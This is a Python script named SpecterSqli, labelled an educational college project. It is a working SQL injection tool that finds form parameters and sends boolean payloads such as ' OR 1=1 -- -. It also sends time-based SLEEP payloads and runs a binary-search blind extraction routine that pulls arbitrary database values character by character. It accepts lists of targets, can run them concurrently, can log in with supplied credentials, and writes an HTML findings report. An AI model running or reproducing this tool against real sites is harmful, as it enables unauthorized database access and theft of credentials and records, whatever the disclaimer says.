#!/usr/bin/env python3
# SpecterSqli
# Author: rhshourav
# Educational & College Project Use Only

import requests
import argparse
import time
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

USER_AGENT = "SpecterSqli/Final"

# =========================
# AUTHENTICATION
# =========================
def authenticated_login(session, opts):
    if not opts.login_url:
        return
    data = {
        opts.login_user_field: opts.login_user,
        opts.login_pass_field: opts.login_pass
    }
    r = session.post(opts.login_url, data=data, timeout=opts.timeout)
    if r.status_code in (200, 302):
        print("[+] Login successful")

# =========================
# PARAM DISCOVERY
# =========================
def discover_params(session, url, timeout):
    params = set()
    try:
        r = session.get(url, timeout=timeout)
        soup = BeautifulSoup(r.text, "html.parser")
        for tag in soup.find_all(["input", "textarea", "select"]):
            if tag.get("name"):
                params.add(tag.get("name"))
    except:
        pass
    return list(params) or ["id"]

# =========================
# BOOLEAN SQLi
# =========================
BOOLEAN_PAYLOADS = [
    "' OR 1=1 -- -",
    "' OR 'a'='a' -- -"
]

def boolean_test(session, url, param, timeout):
    findings = []

    baseline = session.post(url, data={param: "test"}, timeout=timeout)
    base_len = len(baseline.text)

    for payload in BOOLEAN_PAYLOADS:
        r = session.post(url, data={param: payload}, timeout=timeout)
        delta = abs(len(r.text) - base_len)

        findings.append({
            "type": "Boolean-Based SQL Injection",
            "param": param,
            "payload": payload,
            "evidence": {
                "baseline_length": base_len,
                "response_length": len(r.text),
                "length_delta": delta,
                "response_time": r.elapsed.total_seconds()
            },
            "description": (
                "The application dynamically constructs SQL queries using "
                "unsanitized user input, allowing logical manipulation of the query."
            ),
            "exploitation": (
                "In a controlled lab environment, an attacker can alter query "
                "conditions (TRUE/FALSE) to bypass authentication checks or "
                "manipulate application logic."
            ),
            "impact": (
                "This may lead to authentication bypass, unauthorized access, "
                "or exposure of sensitive database records."
            ),
            "severity": "High",
            "remediation": (
                "Use prepared statements or parameterized queries. "
                "Avoid string concatenation in SQL and enforce strict input validation."
            )
        })

    return findings

# =========================
# TIME-BASED SQLi
# =========================
def time_test(session, url, param, sleep, timeout):
    payload = f"' OR IF(1=1,SLEEP({sleep}),0)-- -"
    start = time.time()
    session.post(url, data={param: payload}, timeout=sleep + timeout)
    elapsed = time.time() - start

    vulnerable = elapsed > sleep * 0.8

    return {
        "type": "Time-Based Blind SQL Injection",
        "param": param,
        "payload": payload,
        "evidence": {
            "response_time": round(elapsed, 2),
            "expected_delay": sleep
        },
        "description": (
            "The database executes injected conditional delays, indicating "
            "that user input is evaluated as part of a SQL query."
        ),
        "exploitation": (
            "An attacker can infer database values character by character "
            "by observing response delays, even when no error messages are shown."
        ),
        "impact": (
            "Sensitive data such as database names, user credentials, "
            "or configuration values may be extracted silently."
        ),
        "severity": "Critical" if vulnerable else "Low",
        "remediation": (
            "Disable stacked queries, use parameterized SQL, "
            "and implement server-side input validation."
        )
    }

# =========================
# BLIND EXTRACTION
# =========================
def blind_extract_fast(session, url, param, expr, maxlen, sleep, timeout):
    extracted = ""
    for pos in range(1, maxlen + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            payload = (
                f"' OR IF(ASCII(SUBSTRING(({expr}),{pos},1))>{mid},"
                f"SLEEP({sleep}),0)-- -"
            )
            t0 = time.time()
            session.post(url, data={param: payload}, timeout=sleep + timeout)
            if time.time() - t0 > sleep * 0.8:
                low = mid + 1
            else:
                high = mid - 1
        if not 32 <= low <= 126:
            break
        extracted += chr(low)
        print(f"[+] Extracted: {extracted}")
    return extracted

# =========================
# REPORT
# =========================
def build_html_report(results, file):
    html = """
<html>
<head>
<meta charset="utf-8">
<title>SpecterSqli Final Report</title>
<style>
body { background:#0f172a;color:#e5e7eb;font-family:Arial;padding:20px }
h1,h2 { color:#f8fafc }
table { width:100%;border-collapse:collapse;margin-bottom:30px }
td,th { border:1px solid #1e293b;padding:8px;vertical-align:top }
th { background:#1e293b }
pre { white-space:pre-wrap }
</style>
</head>
<body>
<h1>👻 SpecterSqli – SQL Injection Analysis Report</h1>
<p><b>Author:</b> rhshourav<br>
<b>Purpose:</b> Educational / College Project</p>
"""

    for r in results:
        html += f"<h2>Target: {r['url']}</h2>"

        if r.get("blind"):
            html += f"<p><b>Blind Extracted Data (Lab):</b><pre>{r['blind']}</pre></p>"

        for f in r["findings"]:
            html += f"""
<table>
<tr><th colspan="2">{f['type']}</th></tr>
<tr><td><b>Affected Parameter</b></td><td>{f['param']}</td></tr>
<tr><td><b>Injected Payload</b></td><td><pre>{f['payload']}</pre></td></tr>
<tr><td><b>Description</b></td><td>{f['description']}</td></tr>
<tr><td><b>Exploitation Overview</b></td><td>{f['exploitation']}</td></tr>
<tr><td><b>Impact</b></td><td>{f['impact']}</td></tr>
<tr><td><b>Severity</b></td><td>{f['severity']}</td></tr>
<tr><td><b>Evidence</b></td><td><pre>{f['evidence']}</pre></td></tr>
<tr><td><b>Remediation</b></td><td>{f['remediation']}</td></tr>
</table>
"""
    html += "</body></html>"

    with open(file, "w", encoding="utf-8") as f:
        f.write(html)

# =========================
# ANALYSIS
# =========================
def analyze(url, opts):
    session = requests.Session()
    session.headers["User-Agent"] = USER_AGENT

    authenticated_login(session, opts)

    params = discover_params(session, url, opts.timeout)
    findings = []

    for p in params:
        findings.extend(boolean_test(session, url, p, opts.timeout))
        findings.append(time_test(session, url, p, opts.sleep, opts.timeout))

    blind = None
    if opts.blind:
        blind = blind_extract_fast(
            session, url,
            opts.blind_param or params[0],
            opts.blind,
            opts.maxlen,
            opts.sleep,
            opts.timeout
        )

    return {"url": url, "findings": findings, "blind": blind}

# =========================
# CLI
# =========================
def main():
    ap = argparse.ArgumentParser(description="SpecterSqli - College SQLi Project")
    ap.add_argument("--target")
    ap.add_argument("--targets-file")
    ap.add_argument("--sleep", type=int, default=2)
    ap.add_argument("--maxlen", type=int, default=20)
    ap.add_argument("--blind")
    ap.add_argument("--blind-param")
    ap.add_argument("--login-url")
    ap.add_argument("--login-user")
    ap.add_argument("--login-pass")
    ap.add_argument("--login-user-field", default="username")
    ap.add_argument("--login-pass-field", default="password")
    ap.add_argument("--timeout", type=int, default=6)
    ap.add_argument("--report", default="specter_final_report.html")
    ap.add_argument("--concurrency", action="store_true")
    ap.add_argument("--workers", type=int, default=6)

    opts = ap.parse_args()
    targets = []

    if opts.targets_file:
        with open(opts.targets_file) as f:
            targets = f.read().splitlines()
    if opts.target:
        targets.append(opts.target)
    results = []
    if opts.concurrency:
        with ThreadPoolExecutor(max_workers=opts.workers) as ex:
            results = list(ex.map(lambda u: analyze(u, opts), targets))
    else:
        for t in targets:
            results.append(analyze(t, opts))

    build_html_report(results, opts.report)
    print("[+] Final report saved:", opts.report)

if __name__ == "__main__":
    main()
